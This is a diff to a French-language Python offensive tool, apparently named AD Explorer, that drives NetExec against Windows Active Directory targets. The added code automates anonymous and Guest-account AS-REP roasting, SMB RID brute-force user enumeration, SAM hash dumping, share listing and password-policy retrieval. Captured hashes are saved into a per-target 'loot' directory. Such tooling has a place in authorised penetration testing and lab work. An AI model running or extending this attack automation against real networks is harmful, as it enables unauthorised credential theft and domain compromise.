@@ -113,6 +113,16 @@ def get_nxc_executable():
 
 NXC_CMD = get_nxc_executable()
 
+# Répertoire pour sauvegarder les "loots" (hashes, etc.)
+LOOT_DIR = "ad_explorer_loot"
+os.makedirs(LOOT_DIR, exist_ok=True)
+
+def get_target_loot_dir(target_ip):
+    """Crée et retourne le chemin du répertoire de loot spécifique à la cible."""
+    target_loot_path = os.path.join(LOOT_DIR, target_ip.replace('.', '_'))
+    os.makedirs(target_loot_path, exist_ok=True)
+    return target_loot_path
+
 def run_command(command_list, shell=False, capture_output=True, text=True, check=False):
     """Exécute une commande externe et affiche sa sortie en temps réel."""
     command_str = command_list if shell else " ".join(command_list)
@@ -163,124 +173,160 @@ def run_preliminary_scan(target_ip, scanned_ports_info, session):
     logging.info(f"Exécution du scan préliminaire sur {target_ip}")
     print(f"\n[*] Scan préliminaire Active Directory pour {AnsiColors.CYAN}{target_ip}{AnsiColors.ENDC}:")
 
-    prelim_results = [] # Liste pour stocker les dictionnaires de résultats
+    prelim_results = []
+    target_loot_dir = get_target_loot_dir(target_ip) # Obtenir le répertoire de loot pour cette cible
 
-    # Helper pour ajouter les résultats
     def add_result(description, status, details=""):
         prelim_results.append({"description": description, "status": status, "details": details})
 
-    # 1. Test de connexion LDAP anonyme et extraction d'infos
+    # --- Tests LDAP ---
     ldap_ports_to_try = scanned_ports_info.get("LDAP", []) + scanned_ports_info.get("LDAPS", [])
+    domain_from_ldap = credentials.get("domain") # Utiliser le domaine global s'il est déjà défini
+
     if ldap_ports_to_try:
+        # 1.a Liaison LDAP Anonyme & Infos de Base
         ldap_anon_success = False
-        ldap_details = ""
-        domain_from_ldap = None
-        dns_host_from_ldap = None
+        ldap_anon_details = ""
         for port in ldap_ports_to_try:
-            # nxc gère ldaps via le port ou --ssl, on passe juste le port.
             cmd_ldap_anon = [NXC_CMD, "ldap", f"{target_ip}:{port}", "-u", "", "-p", ""]
             output, ret_code = run_command(cmd_ldap_anon)
-            if output and (ret_code == 0 or "Naming Contexts" in output or "defaultNamingContext" in output or "currentTime" in output):
+            if output and (ret_code == 0 or "Naming Contexts" in output or "defaultNamingContext" in output):
                 ldap_anon_success = True
-                ldap_details += f"Connexion anonyme réussie sur le port {port}. "
-                
+                ldap_anon_details += f"Connexion anonyme OK (port {port}). "
                 dc_match = re.search(r"(?:defaultNamingContext|namingContexts):\s*DC=([^,]+),DC=([^,]+)", output, re.IGNORECASE)
-                if dc_match:
+                if dc_match and not domain_from_ldap: # Mettre à jour le domaine seulement s'il n'est pas déjà connu
                     domain_from_ldap = f"{dc_match.group(1)}.{dc_match.group(2)}".lower()
-                    ldap_details += f"Domaine déduit: {domain_from_ldap}. "
-                
-                dns_host_match = re.search(r"dnsHostName:\s*([^\s]+)", output, re.IGNORECASE)
-                if dns_host_match:
-                    dns_host_from_ldap = dns_host_match.group(1)
-                    ldap_details += f"Nom d'hôte DNS: {dns_host_from_ldap}. "
-                
-                # Si un domaine est trouvé et que les credentials globaux n'ont pas de domaine, on le met à jour
-                if domain_from_ldap and not credentials["domain"]:
-                    credentials["domain"] = domain_from_ldap
-                    multi_credentials["domain"] = domain_from_ldap # Aussi pour multi_creds
-                    ldap_details += f"Domaine global mis à jour: {domain_from_ldap}. "
-                break 
-        add_result("Liaison LDAP Anonyme", 
-                   format_status(ldap_anon_success, text_if_failure="Échec/Non Permis"), 
-                   ldap_details.strip())
-    else:
-        add_result("Liaison LDAP Anonyme", f"{AnsiColors.YELLOW}Non testé (port LDAP/S non détecté){AnsiColors.ENDC}")
-
-    # 2. Scan SMB (Session Nulle - Partages & Heure)
-    smb_ports_to_try = scanned_ports_info.get("SMB", [])
-    if smb_ports_to_try:
-        smb_shares_details = ""
-        smb_time_details = ""
-        smb_shares_success = False
-        smb_time_success = False
-
-        for port in smb_ports_to_try:
-            # Test des partages en session nulle
-            cmd_smb_shares = [NXC_CMD, "smb", f"{target_ip}:{port}", "-u", "", "-p", "", "--shares"]
-            output_shares, ret_code_shares = run_command(cmd_smb_shares)
-            if output_shares and ret_code_shares == 0: # Succès si nxc retourne 0 et liste des partages
-                smb_shares_success = True
-                found_shares = []
-                for line in output_shares.splitlines():
-                    # Chercher les lignes qui listent des partages (adapter le regex si besoin)
-                    # Exemple de ligne: "READ, WRITE   SHARE_NAME       Description"
-                    # Ou simplement si la sortie contient des noms de partages connus comme IPC$, ADMIN$
-                    if re.search(r"(IPC\$|ADMIN\$|C\$|PRINT\$|SYSVOL|NETLOGON)", line, re.IGNORECASE):
-                        share_name_match = re.match(r"\s*([^\s]+)\s+Disk\s+", line) # Heuristique
-                        if share_name_match:
-                             found_shares.append(share_name_match.group(1))
-                        elif "IPC$" in line: found_shares.append("IPC$ (confirmé)")
-
-                if found_shares:
-                    smb_shares_details += f"Partages trouvés (port {port}): {', '.join(list(set(found_shares)))}. "
-                elif "Listing shares" in output_shares : # nxc a tenté mais n'a rien trouvé ou pas eu accès
-                     smb_shares_details += f"Tentative de listage des partages (port {port}), vérifier la sortie. "
-                else: # Si la commande a réussi mais pas de partages évidents
-                    smb_shares_details += f"Connexion SMB anonyme réussie (port {port}), pas de partages évidents listés. "
-
-
-            # Test de l'heure du serveur
-            cmd_smb_time = [NXC_CMD, "smb", f"{target_ip}:{port}", "-u", "", "-p", "", "--local-auth", "--time"]
-            output_time, ret_code_time = run_command(cmd_smb_time)
-            if output_time and ret_code_time == 0:
-                time_match = re.search(r"Host time:\s*(.*)", output_time, re.IGNORECASE)
-                if time_match:
-                    smb_time_success = True
-                    smb_time_details += f"Heure du serveur (port {port}): {time_match.group(1).strip()}. "
-            if smb_shares_success and smb_time_success: # Si les deux ont réussi sur ce port
+                    credentials["domain"] = domain_from_ldap # Mettre à jour globalement
+                    multi_credentials["domain"] = domain_from_ldap
+                    ldap_anon_details += f"Domaine déduit et mis à jour: {domain_from_ldap}. "
                 break
-        
-        add_result("SMB Session Nulle (Partages)", 
-                   format_status(smb_shares_success, text_if_failure="Échec/Non Permis"), 
-                   smb_shares_details.strip())
-        add_result("Heure du Serveur (SMB Anonyme)", 
-                   format_status(smb_time_success, text_if_failure="Échec/Non Obtenue"), 
-                   smb_time_details.strip())
-    else:
-        add_result("SMB Session Nulle (Partages)", f"{AnsiColors.YELLOW}Non testé (port SMB non détecté){AnsiColors.ENDC}")
-        add_result("Heure du Serveur (SMB Anonyme)", f"{AnsiColors.YELLOW}Non testé (port SMB non détecté){AnsiColors.ENDC}")
+        add_result("LDAP: Liaison Anonyme", format_status(ldap_anon_success, text_if_failure="Échec/Non Permis"), ldap_anon_details.strip())
 
-    # 3. Politique de Mots de Passe (LDAP Anonyme)
-    if ldap_ports_to_try: # Réutiliser les ports LDAP/S
+        # 1.b Politique de Mots de Passe (LDAP Anonyme)
         pass_pol_success = False
         pass_pol_details = ""
-        for port in ldap_ports_to_try:
-            cmd_pass_pol = [NXC_CMD, "ldap", f"{target_ip}:{port}", "-u", "", "-p", "", "--pass-pol"]
-            output, ret_code = run_command(cmd_pass_pol)
-            if output and ret_code == 0 and "Password Policy" in output:
-                pass_pol_success = True
-                # Extraire des infos clés (simplifié, nxc donne beaucoup de détails)
-                min_len_match = re.search(r"MinimumPasswordLength:\s*(\d+)", output)
-                lockout_match = re.search(r"LockoutThreshold:\s*(\d+)", output)
-                pass_pol_details += f"Politique trouvée (port {port}). "
-                if min_len_match: pass_pol_details += f"Longueur min: {min_len_match.group(1)}. "
-                if lockout_match: pass_pol_details += f"Seuil verrouillage: {lockout_match.group(1)}. "
-                break
-        add_result("Politique Mots de Passe (LDAP Anonyme)",
-                   format_status(pass_pol_success, text_if_failure="Échec/Non Obtenue"),
-                   pass_pol_details.strip())
+        if ldap_anon_success: # Tenter seulement si la liaison anonyme a fonctionné
+            for port in ldap_ports_to_try: # Utiliser le premier port qui a fonctionné pour l'anonyme ou retester
+                cmd_pass_pol = [NXC_CMD, "ldap", f"{target_ip}:{port}", "-u", "", "-p", "", "--pass-pol"]
+                output, ret_code = run_command(cmd_pass_pol)
+                if output and ret_code == 0 and ("Password Policy" in output or "minPwdLength" in output):
+                    pass_pol_success = True
+                    min_len_match = re.search(r"MinimumPasswordLength:\s*(\d+)", output, re.IGNORECASE)
+                    lockout_match = re.search(r"LockoutThreshold:\s*(\d+)", output, re.IGNORECASE)
+                    pass_pol_details += f"Politique trouvée (port {port}). "
+                    if min_len_match: pass_pol_details += f"Longueur min: {min_len_match.group(1)}. "
+                    if lockout_match: pass_pol_details += f"Seuil verrouillage: {lockout_match.group(1)}. "
+                    break
+        add_result("LDAP: Politique Mots de Passe (Anonyme)", format_status(pass_pol_success, text_if_failure="Échec/Non Obtenue"), pass_pol_details.strip())
+
+        # 1.c AS-REP Roasting (LDAP Anonyme)
+        asrep_success = False
+        asrep_details = ""
+        if domain_from_ldap: # Nécessite un domaine
+            asrep_file = os.path.join(target_loot_dir, f"asreproast_hashes_{target_ip}.txt")
+            for port in ldap_ports_to_try:
+                cmd_asrep = [NXC_CMD, "ldap", f"{target_ip}:{port}", "-d", domain_from_ldap, "-u", "", "-p", "", "--asreproast", asrep_file]
+                output, ret_code = run_command(cmd_asrep)
+                if ret_code == 0 and os.path.exists(asrep_file) and os.path.getsize(asrep_file) > 0:
+                    asrep_success = True
+                    asrep_details = f"Hashes AS-REP potentiels sauvegardés dans {asrep_file}"
+                    break
+                elif "No users found without Kerberos preauthentication" in output:
+                    asrep_details = "Aucun utilisateur vulnérable à AS-REP Roasting trouvé."
+                    asrep_success = True # Le test a réussi, mais pas de vuln
+                    break
+            add_result(f"LDAP: AS-REP Roasting (Anonyme, {domain_from_ldap})", format_status(asrep_success, text_if_failure="Échec/Erreur"), asrep_details)
+        else:
+            add_result("LDAP: AS-REP Roasting (Anonyme)", f"{AnsiColors.YELLOW}Non testé (domaine non découvert){AnsiColors.ENDC}")
     else:
-        add_result("Politique Mots de Passe (LDAP Anonyme)", f"{AnsiColors.YELLOW}Non testé (port LDAP/S non détecté){AnsiColors.ENDC}")
+        add_result("LDAP: Tests", f"{AnsiColors.YELLOW}Non testé (port LDAP/S non détecté){AnsiColors.ENDC}")
+
+    # --- Tests SMB ---
+    smb_ports_to_try = scanned_ports_info.get("SMB", [])
+    if smb_ports_to_try:
+        smb_auth_methods = [
+            {"name": "Anonyme", "user": "", "pass": ""},
+            {"name": "Guest", "user": "Guest", "pass": ""}
+        ]
+
+        for auth in smb_auth_methods:
+            auth_name = auth["name"]
+            user, password = auth["user"], auth["pass"]
+            
+            # 2.a Partages SMB
+            shares_success = False
+            shares_details = ""
+            for port in smb_ports_to_try:
+                cmd_shares = [NXC_CMD, "smb", f"{target_ip}:{port}", "-u", user, "-p", password, "--shares"]
+                output, ret_code = run_command(cmd_shares)
+                if output and ret_code == 0:
+                    shares_success = True
+                    found_shares_list = [line.split()[0] for line in output.splitlines() if "$" in line or "READ" in line or "WRITE" in line] # Heuristique
+                    if found_shares_list:
+                        shares_details += f"Partages (port {port}): {', '.join(list(set(found_shares_list)))}. "
+                    else:
+                        shares_details += f"Connexion SMB OK (port {port}), pas de partages évidents. "
+                    break # Succès sur un port suffit pour ce test d'auth
+            add_result(f"SMB: Partages ({auth_name})", format_status(shares_success, text_if_failure="Échec/Non Permis"), shares_details.strip())
+
+            # 2.b Heure du Serveur SMB
+            time_success = False
+            time_details = ""
+            for port in smb_ports_to_try:
+                cmd_time = [NXC_CMD, "smb", f"{target_ip}:{port}", "-u", user, "-p", password, "--time"]
+                output, ret_code = run_command(cmd_time)
+                if output and ret_code == 0:
+                    time_match = re.search(r"Host time:\s*(.*)", output, re.IGNORECASE)
+                    if time_match:
+                        time_success = True
+                        time_details += f"Heure (port {port}): {time_match.group(1).strip()}. "
+                        break
+            add_result(f"SMB: Heure du Serveur ({auth_name})", format_status(time_success, text_if_failure="Échec/Non Obtenue"), time_details.strip())
+
+            # 2.c RID Brute SMB
+            rid_success = False
+            rid_details = ""
+            for port in smb_ports_to_try:
+                cmd_rid = [NXC_CMD, "smb", f"{target_ip}:{port}", "-u", user, "-p", password, "--rid-brute"]
+                # On pourrait ajouter une plage de RID ici, ex: cmd_rid.extend(["--rid-brute", "500-1500"])
+                output, ret_code = run_command(cmd_rid)
+                # Le succès du RID brute est si la commande s'exécute et trouve des utilisateurs.
+                # nxc retourne 0 même si aucun utilisateur n'est trouvé mais que la connexion est ok.
+                if ret_code == 0: # La commande s'est exécutée
+                    # Chercher des indicateurs d'utilisateurs trouvés
+                    if re.search(r"\[\+\] Found user:", output) or re.search(r"SidTypeUser", output):
+                        rid_success = True
+                        rid_details += f"Utilisateurs potentiels trouvés via RID Brute (port {port}). Vérifier la sortie. "
+                    else:
+                        rid_details += f"RID Brute exécuté (port {port}), aucun utilisateur explicitement listé. "
+                    # Si la commande s'exécute sans erreur, on considère le test comme "passé"
+                    # même si aucun utilisateur n'est trouvé, car la fonctionnalité a été testée.
+                    # Pour un statut plus précis, il faudrait parser plus finement.
+                    if not rid_success : rid_success = True # Marquer comme succès si la commande a tourné
+                    break
+            add_result(f"SMB: RID Brute ({auth_name})", format_status(rid_success, text_if_failure="Échec/Erreur"), rid_details.strip())
+
+            # 2.d Dump SAM Hashes SMB (tentative)
+            sam_success = False
+            sam_details = ""
+            for port in smb_ports_to_try:
+                cmd_sam = [NXC_CMD, "smb", f"{target_ip}:{port}", "-u", user, "-p", password, "--sam"]
+                output, ret_code = run_command(cmd_sam)
+                if output and ret_code == 0 and re.search(r"\$[0-9a-fA-F]+\*+\*[0-9a-fA-F]+", output): # Recherche de format de hash NTLM
+                    sam_success = True
+                    sam_details += f"Hashes SAM potentiels trouvés (port {port}). Vérifier la sortie. "
+                    break
+                elif ret_code == 0 : # Commande exécutée mais pas de hashes évidents
+                     sam_details += f"Tentative --sam (port {port}) exécutée, pas de hashes évidents. "
+
+            # Si la commande --sam réussit (ret_code 0) mais ne trouve pas de hashes (accès refusé typiquement),
+            # ce n'est pas un échec de la commande elle-même.
+            # On marque succès si la commande a pu s'exécuter.
+            if not sam_success and "ACCESS_DENIED" not in (output or "") and ret_code == 0 : sam_success = True 
+
+            add_result(f"SMB: Dump SAM Hashes ({auth_name})", format_status(sam_success, text_if_failure="Échec/Accès Refusé"), sam_details.strip())
+    else:
+        add_result("SMB: Tests", f"{AnsiColors.YELLOW}Non testé (port SMB non détecté){AnsiColors.ENDC}")
     
     # Affichage des résultats
     print("\n--- Résultats du Scan Préliminaire ---")
@@ -1119,14 +1165,13 @@ def main_loop(target_ip, scanned_ports, session):
     
     # Dictionnaire des commandes pour l'affichage de l'aide (structuré par sections)
     target_commands_help = {
-        "Commandes Générales": {
+        "Informations et Scan": {
             "help": "Afficher ce message d'aide.",
-            "services": "Afficher les services détectés lors du scan initial.",
-            "prelim_scan": "Effectuer un scan préliminaire rapide (LDAP/SMB anonyme, ports AD).",
-            "back": "Quitter la session avec la cible actuelle.",
-            "exit": "Quitter l'application ADExplorer."
+            "services": "Afficher les services et ports ouverts détectés sur la cible.",
+            "prelim_scan": "Lancer un scan préliminaire complet (LDAP, SMB, etc.) pour des infos de base et vulnérabilités communes.",
+            "exit": "Quitter AD Explorer."
         },
-        "Gestion des Identifiants (Session Unique)": {
+        "Gestion des Identifiants": {
             "set user <username>": "Définir le nom d'utilisateur pour les actions manuelles futures.",
             "set password <password>": "Définir le mot de passe pour les actions manuelles futures.",
             "set domain <domain>": "Définir le domaine pour les actions manuelles futures (et pour `testcreds` si non spécifié dans multi_credentials).",
@@ -1144,14 +1189,14 @@ def main_loop(target_ip, scanned_ports, session):
             "creds": "Afficher tous les identifiants actuellement configurés (session unique et multiples).",
             "clear creds": "Effacer tous les identifiants configurés (session unique et multiples)."
         },
-        "Actions d'Exploration et Tests": {
-            "smb": "Explorer les services SMB détectés (partages, sessions nulles, etc.).",
-            "ldap": "Explorer les services LDAP/LDAPS détectés (requêtes, AS-REP Roasting, etc.).",
-            "mssql": "Explorer les services MSSQL détectés.", # Ajout de mssql
-            "discoverusers": "Tenter différentes techniques de découverte d'utilisateurs.",
-            "testcreds": "Lancer une batterie de tests d'authentification avec les identifiants multiples configurés."
+        "Actions d'Exploration et Tests (par protocole)": {
+            "smb": "Explorer les services SMB détectés (partages, sessions, RID brute, SAM, etc.).",
+            "ldap": "Explorer les services LDAP/LDAPS détectés (requêtes, AS-REP/Kerberoasting, politique de mdp, etc.).",
+            "mssql": "Explorer les services MSSQL détectés.",
+            "discoverusers": "Accéder au sous-menu pour les techniques de découverte d'utilisateurs (Kerbrute, RPC, etc.).",
+            "testcreds": "Lancer une batterie de tests d'authentification avec les identifiants multiples configurés sur les services."
         },
-        "Utilitaires Réseau": { # Nouvelle section
+        "Utilitaires Réseau": {
             "generatehosts <subnet_cidr>": "Découvrir les hôtes sur un sous-réseau et générer des entrées /etc/hosts (ex: 10.10.10.0/24)."
         }
     }
